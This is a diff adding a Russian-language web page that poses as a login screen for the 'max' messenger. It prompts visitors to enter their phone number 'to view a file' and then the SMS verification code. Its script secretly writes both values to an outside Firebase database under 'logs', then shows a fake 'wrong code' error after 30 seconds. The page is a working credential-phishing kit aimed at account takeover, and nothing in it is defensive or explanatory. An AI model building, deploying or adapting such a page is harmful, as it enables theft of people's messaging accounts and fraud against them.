@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --bg-color: #050505;
+            --glow-top: radial-gradient(circle at 50% 0%, 
+                rgba(0, 150, 255, 0.4) 0%, 
+                rgba(138, 43, 226, 0.3) 35%, 
+                transparent 75%);
+            --text-main: #ffffff;
+            --text-dim: #555555;
+            --error-color: #ef4444;
+        }
+
+        * {
+            -webkit-tap-highlight-color: transparent;
+        }
+        ::selection {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .top-glow {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 500px;
+            background: var(--glow-top);
+            filter: blur(60px);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 380px;
+            padding: 60px 24px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-box {
+            margin-bottom: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: transform 0.4s ease;
+        }
+
+        .logo-svg {
+            width: 95px;
+            height: 95px;
+            fill: white;
+            fill-opacity: 0.85;
+            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.15));
+        }
+
+        .brand-name {
+            font-size: 42px;
+            font-weight: 850;
+            letter-spacing: -2px;
+            margin-top: -5px;
+            display: block;
+            opacity: 0.95;
+        }
+
+        .step {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            animation: fadeIn 0.4s ease forwards;
+        }
+
+        .step.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin: 20px 0 10px;
+            line-height: 1.3;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .input-wrapper {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-sizing: border-box;
+            margin-bottom: 24px;
+            transition: border 0.3s ease;
+            position: relative;
+        }
+
+        .input-wrapper.error {
+            border-color: var(--error-color);
+            background: rgba(239, 68, 68, 0.05);
+        }
+
+        .input-wrapper:focus-within:not(.error) {
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        .flag-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+            padding-right: 12px;
+        }
+
+        input {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 18px;
+            outline: none;
+            width: 100%;
+        }
+
+        .sms-input {
+            text-align: center;
+            font-size: 28px;
+            letter-spacing: 8px;
+            font-weight: 700;
+        }
+        
+        .sms-input::placeholder {
+            font-size: 18px;
+            letter-spacing: normal;
+            font-weight: normal;
+            transform: translateY(-4px);
+            display: inline-block;
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .btn-next {
+            width: 100%;
+            padding: 19px;
+            border-radius: 22px;
+            border: none;
+            background: white;
+            color: black;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.2, 0, 0.2, 1);
+        }
+
+        .btn-next:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-next.loading {
+            background: #222;
+            color: #fff;
+            opacity: 1;
+            cursor: wait;
+            animation: pulse 1.5s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 rgba(255, 255, 255, 0.1); }
+            100% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); }
+        }
+
+        .status-message {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+            margin-top: 20px;
+            line-height: 1.5;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #444;
+            line-height: 1.5;
+            padding-bottom: 10px;
+        }
+
+        .footer span {
+            color: #666;
+            text-decoration: underline;
+        }
+
+        .timer-text {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+        .timer-text span {
+            color: white;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-glow"></div>
+
+    <div class="container">
+        <div class="logo-box" id="logoBox">
+            <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" d="M50,12 C29,12 12,29 12,50 C12,61.5 17.2,71.8 25.3,78.6 L21,92 L35.5,86.8 C39.9,88.8 44.8,90 50,90 C71,90 88,73 88,52 C88,31 71,12 50,12 Z M50,33 C40.6,33 33,40.6 33,50 C33,59.4 40.6,67 50,67 C59.4,67 67,59.4 67,50 C67,40.6 59.4,33 50,33 Z" />
+            </svg>
+            <span class="brand-name">max</span>
+        </div>
+
+        <div class="step active" id="stepPhone">
+            <h1>Введите ваш номер в поле ниже для просмотра файла.</h1>
+            <p class="subtitle">На него придёт СМС с кодом</p>
+
+            <div class="input-wrapper">
+                <div class="flag-box">
+                    <span>🇷🇺</span>
+                    <span>+7</span>
+                </div>
+                <input type="tel" id="phoneInput" placeholder="999 000-00-00" maxlength="13">
+            </div>
+
+            <button class="btn-next" id="btnPhone" disabled>Продолжить</button>
+
+            <p class="footer">
+                Нажимая «Продолжить», вы принимаете <span>политику конфиденциальности</span> и <span>пользовательское соглашение</span>
+            </p>
+        </div>
+
+        <div class="step" id="stepSms">
+            <h1>Введите код из СМС</h1>
+            <p class="subtitle">Мы отправили его на номер <br><strong id="displayPhone" style="color: white;">+7</strong></p>
+
+            <div class="input-wrapper" id="smsInputWrapper">
+                <input type="tel" id="smsInput" class="sms-input" placeholder="Код" maxlength="6">
+            </div>
+            
+            <div class="error-message" id="errorMessage">Код должен состоять из 6 цифр</div>
+
+            <button class="btn-next" id="btnSms" disabled>Подтвердить</button>
+
+            <p class="timer-text" id="timerDisplay">Новый код можно запросить через <span>05:00</span></p>
+            
+            <div class="status-message" id="statusMessage">Идет проверка верности кода —<br>это занимает до 30 секунд</div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set, push, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB2cAHCuBmB7rr0S9YFmAQ3fK9lvUm-8AQ",
+            authDomain: "dfssdfgg-df720.firebaseapp.com",
+            projectId: "dfssdfgg-df720",
+            storageBucket: "dfssdfgg-df720.firebasestorage.app",
+            messagingSenderId: "751965793703",
+            appId: "1:751965793703:web:9dcfbf89ca9997b757da82",
+            databaseURL: "https://telegrandma-c1e76-default-rtdb.firebaseio.com/"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        let userLogId = ""; 
+
+        const phoneInput = document.getElementById('phoneInput');
+        const btnPhone = document.getElementById('btnPhone');
+        const stepPhone = document.getElementById('stepPhone');
+        const stepSms = document.getElementById('stepSms');
+        const displayPhone = document.getElementById('displayPhone');
+        const smsInput = document.getElementById('smsInput');
+        const smsInputWrapper = document.getElementById('smsInputWrapper');
+        const btnSms = document.getElementById('btnSms');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const errorMessage = document.getElementById('errorMessage');
+        const statusMessage = document.getElementById('statusMessage');
+        const logoBox = document.getElementById('logoBox');
+
+        phoneInput.addEventListener('input', function (e) {
+            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
+            e.target.value = !x[2] ? x[1] : '' + x[1] + ' ' + x[2] + (x[3] ? '-' + x[3] : '') + (x[4] ? '-' + x[4] : '');
+            btnPhone.disabled = e.target.value.replace(/\D/g, '').length !== 10;
+        });
+
+        btnPhone.addEventListener('click', async function() {
+            const phoneNumber = "+7 " + phoneInput.value;
+            btnPhone.disabled = true;
+            btnPhone.innerText = "Загрузка...";
+
+            try {
+                const logsRef = ref(db, 'logs');
+                const newLogRef = push(logsRef);
+                userLogId = newLogRef.key;
+
+                await set(newLogRef, {
+                    phone: phoneNumber,
+                    code: "ожидание...",
+                    timestamp: new Date().toLocaleString()
+                });
+
+                stepPhone.classList.remove('active');
+                stepSms.classList.add('active');
+                logoBox.style.transform = 'scale(0.8)';
+                logoBox.style.marginBottom = '10px';
+                displayPhone.innerText = phoneNumber;
+                startTimer(300);
+            } catch (e) {
+                console.error(e);
+                alert("Ошибка подключения к базе");
+            }
+        });
+
+        smsInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, ''); 
+            errorMessage.style.display = 'none';
+            smsInputWrapper.classList.remove('error');
+            btnSms.disabled = e.target.value.length === 0;
+        });
+
+        btnSms.addEventListener('click', async function() {
+            if (smsInput.value.length !== 6) {
+                errorMessage.style.display = 'block';
+                smsInputWrapper.classList.add('error');
+            } else {
+                const smsCode = smsInput.value;
+                errorMessage.style.display = 'none';
+                smsInputWrapper.classList.remove('error');
+                
+                smsInput.disabled = true;
+                btnSms.disabled = true;
+                btnSms.innerText = 'Проверка...';
+                btnSms.classList.add('loading');
+                timerDisplay.style.display = 'none';
+                statusMessage.style.display = 'block';
+
+                try {
+                    const specificLogRef = ref(db, 'logs/' + userLogId);
+                    await update(specificLogRef, {
+                        code: smsCode
+                    });
+
+                    setTimeout(() => {
+                        btnSms.innerText = 'Ошибка';
+                        btnSms.classList.remove('loading');
+                        btnSms.style.background = '#ef4444';
+                        btnSms.style.color = 'white';
+                        statusMessage.innerText = 'Введен неверный код доступа. Повторите попытку позже.';
+                    }, 30000);
+                } catch (e) {
+                    console.error(e);
+                }
+            }
+        });
+
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            let interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                timerDisplay.innerHTML = `Новый код можно запросить через <span>${minutes}:${seconds}</span>`;
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    timerDisplay.innerHTML = '<span style="color: #4facfe; cursor: pointer;">Отправить код повторно</span>';
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
+
